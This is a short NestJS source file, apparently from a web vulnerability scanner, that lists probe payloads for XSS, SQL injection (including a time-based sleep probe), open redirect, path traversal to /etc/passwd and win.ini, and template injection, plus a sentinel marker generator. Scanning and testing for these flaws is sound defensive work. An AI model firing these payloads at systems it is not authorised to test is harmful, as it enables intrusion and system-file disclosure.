import { Injectable } from '@nestjs/common';

export type PayloadType = 'xss' | 'sqli' | 'redirect' | 'lfi' | 'ssti';

@Injectable()
export class PayloadMutator {
  private readonly payloads: Record<PayloadType, string[]> = {
    xss: [
      '<script>alert(1)</script>',
      '"><script>alert(1)</script>',
      '"><img src=x onerror=alert(1)>',
      '<svg/onload=alert(1)>'
    ],
    sqli: [
      "' OR 1=1 --",
      '" OR 1=1 --',
      "' OR 'a'='a",
      "' OR sleep(3) --"
    ],
    redirect: [
      'https://google.com',
      '//google.com',
      '///google.com'
    ],
    lfi: [
      '../../../../../../../../etc/passwd',
      '..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd',
      '../../../../../../../../windows/win.ini',
      '/etc/passwd'
    ],
    ssti: [
      '{{7*7}}',
      '${7*7}',
      '<%= 7*7 %>'
    ]
  };

  generate(type: PayloadType): string[] {
    return this.payloads[type] || [];
  }

  generateMarker(): string {
    return `SENTINEL_${Date.now()}_${Math.random().toString(36).slice(2, 7)}`.toUpperCase();
  }
}